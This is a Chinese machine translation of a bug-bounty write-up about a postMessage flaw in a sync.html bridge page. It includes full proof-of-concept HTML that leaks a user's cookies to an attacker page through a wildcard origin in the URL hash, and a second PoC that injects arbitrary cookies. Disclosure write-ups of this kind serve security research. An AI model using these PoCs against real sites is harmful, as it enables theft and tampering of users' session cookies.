<html>
<head>
<title>Exploiting post message to steal and replace user’s cookies</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">利用post消息窃取并替换用户的cookies</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/exploiting-post-message-to-steal-users-cookies-7df43a00289a?source=collection_archive---------0-----------------------#2018-11-30">https://infosecwriteups.com/exploiting-post-message-to-steal-users-cookies-7df43a00289a?source=collection_archive---------0-----------------------#2018-11-30</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="fb4b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">你好</p><p id="2a4e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在检查与目标相关的记录的HTTP请求的历史时，我发现了一个接收器，它帮助我利用post消息并窃取或编辑用户的cookies。</p><p id="fb4c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">不幸的是，我的大部分发现属于私人项目，所以我们不会透露全部细节。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi kl"><img src="../Images/d14f08d80b6febf40b31cc84d4d2f1f0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1000/1*XPxffGx-pB8uESwrMsnuVQ.gif"/></div></figure><p id="4ee2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"># <strong class="jp ir">背景</strong></p><p id="75d7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">曾经需要在窗口或当前窗口和内部iframe之间进行通信吗？也是跨域的吗？我敢打赌，你有，但现在我们有一个很好的选择这样做！</p><p id="f6d5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">该解决方案被称为postMessage，是HTML5 Web消息规范的一部分。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi ku"><img src="../Images/8df5b793523ac9783865f7373c95d08b.png" data-original-src="https://miro.medium.com/v2/resize:fit:960/format:webp/1*jJcQMmrnLadGQe7PGQ83Ag.jpeg"/></div><figcaption class="kv kw gj gh gi kx ky bd b be z dk translated"><strong class="bd kz">让我们举一个例子</strong></figcaption></figure><p id="119a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在这个例子中，我们将有一个包含js行的页面来监听传入的消息并记录它们。</p><p id="4d7a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="la">主页面中的代码</em></p><pre class="km kn ko kp gt lb lc ld le aw lf bi"><span id="8a87" class="lg lh iq lc b gy li lj l lk ll">&lt;script&gt;<br/>    function messages(event)<br/>    {<br/>        console.log(event); <br/>    }<br/>    window.addEventListener(‘message’,messages,false);<br/>    console.log(“listening”);<br/> &lt;/script&gt;<br/>&lt;<strong class="lc ir">iframe </strong>src="url/child.html"&gt;&lt;/<strong class="lc ir">iframe</strong>&gt;</span></pre><p id="e1f1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">子页面中的一行向父页面发送消息。</p><p id="a098" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="la">子页面中的代码</em></p><pre class="km kn ko kp gt lb lc ld le aw lf bi"><span id="e2ca" class="lg lh iq lc b gy li lj l lk ll">window.parent.postMessage("Hello parent", "target");</span></pre><p id="cc7e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">发生什么事了？</p><ul class=""><li id="683b" class="lm ln iq jp b jq jr ju jv jy lo kc lp kg lq kk lr ls lt lu bi translated">首先，您访问呈现和加载子页面的主页。</li></ul><p id="862c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">。子页面向其父页面发送消息，父页面通过控制台接收并记录消息。</p><p id="3f5d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">你认为这里有什么安全问题吗？</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi lv"><img src="../Images/25f7e1350d4752a98ee940cd1a40ee2d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1150/1*8PrkCmEbL7aer0lmmIRpBw.gif"/></div></figure><ul class=""><li id="297d" class="lm ln iq jp b jq jr ju jv jy lo kc lp kg lq kk lr ls lt lu bi translated">你能想象如果用户可以控制<code class="fe lw lx ly lc b">target</code>的值会发生什么吗</li><li id="14b9" class="lm ln iq jp b jq lz ju ma jy mb kc mc kg md kk lr ls lt lu bi translated">如果子页面容易被点击劫持怎么办</li></ul><p id="4d82" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">提示</strong></p><p id="947c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果目标原点是星号<code class="fe lw lx ly lc b">*</code>则消息可以发送到任何有引用的子页面域。</p><p id="a696" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这取决于具体情况。这可能会导致严重的问题。让我们用一个在知名公司发现的真实例子来演示。</p><p id="26fe" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">回到发现。</strong></p><p id="3898" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们称我们的目标为onga.com，这意味着什么？</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="mf mg di mh bf mi"><div class="gh gi me"><img src="../Images/c500709dc978719c11d9a5c1ef38650b.png" data-original-src="https://miro.medium.com/v2/resize:fit:952/1*W8On8oitP2gWOgSZ9K8gFg.gif"/></div></div></figure><p id="1a33" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">无论如何，我搜索了这个领域，开始寻找一些有趣的东西。遍历所有被抓取的页面，我的扫描仪捕获了一个html文件<code class="fe lw lx ly lc b">sync.html</code>，里面有少量的HTML内容。</p><p id="9e76" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">据报道有不安全的Javascript语句。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="mf mg di mh bf mi"><div class="gh gi mj"><img src="../Images/7bce6f9b66b713d793ac5df82a04380a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*1bzZ3_tGS69gRbl9FpeEfA.png"/></div></div><figcaption class="kv kw gj gh gi kx ky bd b be z dk translated">不安全代码检测</figcaption></figure><p id="cc15" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">该文件没有元素，而不是一个脚本标签，似乎它作为一个桥梁。</p><p id="25e5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在查看<code class="fe lw lx ly lc b">sync.html </code>文件时，我注意到一条post消息被发送到一个名为<code class="fe lw lx ly lc b">wOrigin</code>的变量</p><pre class="km kn ko kp gt lb lc ld le aw lf bi"><span id="80b5" class="lg lh iq lc b gy li lj l lk ll">window.parent.postMessage(JSON.stringify(msg), wOrigin);</span></pre><p id="67e3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们现在有两个主要变量:<code class="fe lw lx ly lc b">msg</code>和<code class="fe lw lx ly lc b">wOrigin</code></p><p id="6bef" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我上下滚动来看这些变量在哪里被初始化，它们在我的控制之下吗？</p><p id="1751" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">令人惊讶的是<code class="fe lw lx ly lc b">msg</code>变量是cookies，另一个是用户输入。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi mk"><img src="../Images/5b3a783452060acbe78c9e5932f32acf.png" data-original-src="https://miro.medium.com/v2/resize:fit:996/1*SSm1cFTYtY_FrsTSJWgyBQ.gif"/></div></figure><p id="6e77" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">寻找第二个变量，幸运的是我只找到了3次。</p><p id="c3e6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">首先查看这个代码片段，注意下面几行:</p><pre class="km kn ko kp gt lb lc ld le aw lf bi"><span id="f731" class="lg lh iq lc b gy li lj l lk ll">        var fdata = JSON.parse(decodeURIComponent(window.location.hash.substr(1)));<br/>        var ns = fdata.ns;<br/>        var worigin = fdata.worigin;</span></pre><p id="5a4e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">代码非常简单，</p><ul class=""><li id="4ab8" class="lm ln iq jp b jq jr ju jv jy lo kc lp kg lq kk lr ls lt lu bi translated">首先，它访问当前窗口的url哈希</li><li id="36af" class="lm ln iq jp b jq lz ju ma jy mb kc mc kg md kk lr ls lt lu bi translated">解码它</li><li id="baf0" class="lm ln iq jp b jq lz ju ma jy mb kc mc kg md kk lr ls lt lu bi translated">解析为json对象</li><li id="f55e" class="lm ln iq jp b jq lz ju ma jy mb kc mc kg md kk lr ls lt lu bi translated">创建新的两个变量<code class="fe lw lx ly lc b">ns</code>,代表名称空间和<code class="fe lw lx ly lc b">wOrigin </code>窗口原点</li></ul><p id="8334" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="la">这就是众所周知的sink </em> <code class="fe lw lx ly lc b"><em class="la">window.location.hash</em></code> <em class="la">当你看到它的时候，你应该尝试利用它作为基于dom的xss。但这不是我们的问题。</em></p><p id="f3c9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">很快我继续查看其他代码行，看看这些变量<code class="fe lw lx ly lc b">ns and worigin</code>在传递给postmessage之前是否被净化了，幸运的是它们没有被净化。</p><p id="6705" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">移动剥削</strong></p><p id="5bf1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们需要逆转这个过程</p><ul class=""><li id="195d" class="lm ln iq jp b jq jr ju jv jy lo kc lp kg lq kk lr ls lt lu bi translated">创造两个变量<code class="fe lw lx ly lc b">ns and wOrigin</code></li><li id="e737" class="lm ln iq jp b jq lz ju ma jy mb kc mc kg md kk lr ls lt lu bi translated">给它们分配<code class="fe lw lx ly lc b">ns=anyblah</code>和<code class="fe lw lx ly lc b">wOrigin=*</code></li><li id="8a0b" class="lm ln iq jp b jq lz ju ma jy mb kc mc kg md kk lr ls lt lu bi translated">创建为json对象<code class="fe lw lx ly lc b">{"ns":"anyblah","wOrigin":"*"}</code></li><li id="a66b" class="lm ln iq jp b jq lz ju ma jy mb kc mc kg md kk lr ls lt lu bi translated">创建poc url:</li><li id="1dc2" class="lm ln iq jp b jq lz ju ma jy mb kc mc kg md kk lr ls lt lu bi translated"><code class="fe lw lx ly lc b">http://vulnerable-onga.com/sync.html#{"ns":"anyblah","wOrigin":"*"}</code></li></ul><p id="2e63" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">当页面加载时，一条post消息将被发送到父页面，而不考虑其来源，我们使用通配符<code class="fe lw lx ly lc b">*</code>来处理任何来源。</p><p id="a70a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在我们需要在父页面中设置一个监听器来接收消息。</p><pre class="km kn ko kp gt lb lc ld le aw lf bi"><span id="9106" class="lg lh iq lc b gy li lj l lk ll">&lt;script&gt;<br/>  function rcv(event)<br/>   {   <br/>       console.log(event);<br/>   }<br/>  window.addEventListener('message',rcv,false);<br/>&lt;/script&gt;</span></pre><p id="5919" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">创建一个iframe，将易受攻击的页面作为子页面加载。</p><p id="a594" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">完整概念验证</strong></p><pre class="km kn ko kp gt lb lc ld le aw lf bi"><span id="308d" class="lg lh iq lc b gy li lj l lk ll">&lt;script&gt;<br/>  function rcv(event)<br/>   {<br/>    console.log(event); <br/>   }<br/>  window.addEventListener('message',rcv,false);<br/>&lt;/script&gt;<br/>&lt;iframe src='<!-- -->http://vulnerable-onga.com/sync.html#{"ns":"anyblah","wOrigin":"*"}' /&gt;</span></pre><p id="e903" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">当您打开<code class="fe lw lx ly lc b">http://attacker.com/poc.html</code>时，监听器将运行并等待传入的消息，iframe将被加载，易受攻击的页面将进入iframe，并将包含cookie的消息发送到攻击者的父站点，最后它将被捕获并记录，在我们的示例中，它包含泄露给攻击者的用户cookie。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi mk"><img src="../Images/f7e42d75be957d5690b23d4c261c527b.png" data-original-src="https://miro.medium.com/v2/resize:fit:996/1*dK8VPDeCnEn6iXpRYHE1SQ.gif"/></div></figure><p id="79ab" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们结束了吗？？？</p><p id="37ae" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">当然不是，不要像我以前那样去庆祝，你可能会忘记很多，让我们玩得更开心，因为文件只包含57行，我决定仔细阅读它们。</p><p id="851c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我发现了另一条惊人的线。</p><pre class="km kn ko kp gt lb lc ld le aw lf bi"><span id="ff04" class="lg lh iq lc b gy li lj l lk ll">window.addEventListener('message', h_message);</span></pre><p id="3e07" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">快速开始查看<code class="fe lw lx ly lc b">h_message</code>功能的内容:</p><pre class="km kn ko kp gt lb lc ld le aw lf bi"><span id="d8bb" class="lg lh iq lc b gy li lj l lk ll">function h_message(event) <br/>{<br/>          var data = null;<br/>          try { data = JSON.parse(event.data); } catch(e) { return;}<br/>          if (data.msgType !== "write" &amp;&amp; data.namespace !== ns) {<br/>            return;<br/>          }<br/>          setCookie(data.cookieName, data.cookieVal,parseInt(data.expiresDays, 10), data.secureOnly);        <br/>}<br/></span></pre><p id="8d0b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们了解一下这个函数的目的是什么？</p><ul class=""><li id="1036" class="lm ln iq jp b jq jr ju jv jy lo kc lp kg lq kk lr ls lt lu bi translated">传入的消息应该包含json对象。</li><li id="5358" class="lm ln iq jp b jq lz ju ma jy mb kc mc kg md kk lr ls lt lu bi translated">Json对象应该包含属性<code class="fe lw lx ly lc b">msgType</code>并且必须等于<code class="fe lw lx ly lc b">write</code></li><li id="68ae" class="lm ln iq jp b jq lz ju ma jy mb kc mc kg md kk lr ls lt lu bi translated">另一个属性<code class="fe lw lx ly lc b">namespace</code>应该与位置散列<code class="fe lw lx ly lc b">"ns"</code>中存在的属性相同，两者都在用户的控制之下。</li><li id="66c4" class="lm ln iq jp b jq lz ju ma jy mb kc mc kg md kk lr ls lt lu bi translated">其中一个条件必须满足，而不是两个都满足，因为开发人员使用了负数和运算符，顺便说一下，这不是一个严重的问题</li><li id="3de8" class="lm ln iq jp b jq lz ju ma jy mb kc mc kg md kk lr ls lt lu bi translated">如果是这样，验证将为假，将不会到达return语句，并且将执行对包含其他json属性作为参数的另一个函数的调用<code class="fe lw lx ly lc b">setCookie()</code>。</li></ul><p id="e38c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这确实是易受攻击的，没有对消息来源的验证，因此任何网站都可以发送消息并将恶意值传递给<code class="fe lw lx ly lc b">setCookie</code>函数。</p><p id="17e4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">根据上面的代码，我构建了以下json:</p><pre class="km kn ko kp gt lb lc ld le aw lf bi"><span id="e255" class="lg lh iq lc b gy li lj l lk ll">{"msgType":"write","namespace":"a","cookieName":"injectedt","cookieVal":"hacked","expiresDays":10,"secureOnly":false}</span></pre><p id="4b72" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">并且目标网址会是<code class="fe lw lx ly lc b">/sync.html#{"ns":"a","wOrigin":"*"}</code></p><p id="873a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">完整的poc文件将包含:</p><pre class="km kn ko kp gt lb lc ld le aw lf bi"><span id="0f6c" class="lg lh iq lc b gy li lj l lk ll">&lt;script&gt;<br/>       var tar='http://onga.com/sync.html<!-- -->#{"ns":"a","wOrigin":"*"}<!-- -->';<br/>       var pay={"msgType":"write","namespace":"a","cookieName":"injectedt","cookieVal":"hacked","expiresDays":10,"secureOnly":false};   <br/>       var c= window.open(tar,"child");<br/>       c.postMessage(pay,"*");<br/>&lt;/script&gt;</span></pre><p id="2fbb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">将文件保存为html并打开它，cookie被成功注入，我能够在易受攻击的网站上注入任意cookie。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi ml"><img src="../Images/a4bb516d2405883abfe1cfb70b76be5f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1200/format:webp/1*saoWc2MvFeTB7S9oAY-S9w.jpeg"/></div></figure><p id="9af4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> Tip2 </strong></p><ul class=""><li id="da1a" class="lm ln iq jp b jq jr ju jv jy lo kc lp kg lq kk lr ls lt lu bi translated">如果页面被保护防止点击劫持，你可以使用<code class="fe lw lx ly lc b">window.open('url')</code></li></ul><p id="317c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">【poc1的视频</p><figure class="km kn ko kp gt kq"><div class="bz fp l di"><div class="mm mn l"/></div><figcaption class="kv kw gj gh gi kx ky bd b be z dk translated">偷饼干的Poc1</figcaption></figure><p id="5c74" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">对于该工具，除了请求url和搜索以下模式之外，它什么也不做:</p><pre class="km kn ko kp gt lb lc ld le aw lf bi"><span id="0d32" class="lg lh iq lc b gy li lj l lk ll">(\.location\.hash)|(window\.addEventListener\('message')|(\.postMessage\()</span></pre><p id="d054" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> <em class="la"> Ref </em> </strong></p><ul class=""><li id="4b0c" class="lm ln iq jp b jq jr ju jv jy lo kc lp kg lq kk lr ls lt lu bi translated"><a class="ae kt" href="http://www.sec-1.com/blog/wp-content/uploads/2016/08/Hunting-postMessage-Vulnerabilities.pdf" rel="noopener ugc nofollow" target="_blank">http://www . sec-1 . com/blog/WP-content/uploads/2016/08/Hunting-postMessage-Vulnerabilities.pdf</a></li><li id="58c7" class="lm ln iq jp b jq lz ju ma jy mb kc mc kg md kk lr ls lt lu bi translated"><a class="ae kt" href="https://www.youtube.com/watch?v=XTKqQ9mhcgM" rel="noopener ugc nofollow" target="_blank">https://www.youtube.com/watch?v=XTKqQ9mhcgM</a></li><li id="0edb" class="lm ln iq jp b jq lz ju ma jy mb kc mc kg md kk lr ls lt lu bi translated"><a class="ae kt" href="https://robertnyman.com/2010/03/18/postmessage-in-html5-to-send-messages-between-windows-and-iframes/" rel="noopener ugc nofollow" target="_blank">https://robertnyman . com/2010/03/18/post message-in-html 5-to-send-messages-between-windows-and-iframes/</a></li><li id="62c7" class="lm ln iq jp b jq lz ju ma jy mb kc mc kg md kk lr ls lt lu bi translated"><a class="ae kt" href="https://gist.github.com/YasserGersy/1fc77ff9b678fb5028a272a86c1d2ea1" rel="noopener ugc nofollow" target="_blank">https://gist . github . com/yassergsy/1 fc 77 ff 9b 678 FB 5028 a 272 a 86 C1 D2 ea 1</a></li></ul><p id="a326" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="la">对于任何问题，在推特上DM我或者使用【https://ask.fm/yasserGersy】<a class="ae kt" href="https://ask.fm/yasserGersy" rel="noopener ugc nofollow" target="_blank"><em class="la"/></a></em></p><p id="82df" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">愉快的研究</p></div></div>    
</body>
</html>